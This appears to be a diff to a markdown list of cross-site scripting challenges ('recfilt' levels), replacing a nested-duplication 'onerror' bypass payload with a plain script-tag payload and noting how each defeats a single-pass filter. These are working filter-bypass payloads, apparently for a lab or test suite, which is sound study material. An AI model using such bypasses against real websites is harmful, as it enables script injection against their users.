@@ -11,10 +11,10 @@ Non-recursive (single-pass) filters that can be bypassed by nested duplication o
 
 ### recfilt-level2
 
-`/recfilt/level2/?query=%3Cimg%20src=x%20oonnerrorerror=alert(1)%3E`
+`/recfilt/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`
 
-- payload: `<img src=x oonnerrorerror=alert(1)>`
-- context: `on\w+=` stripped once; nesting reassembles `onerror=`
+- payload: `<script>alert(1)</script>`
+- context: only \bon\w+= handlers are stripped; tags pass untouched
 
 ### recfilt-level3
 
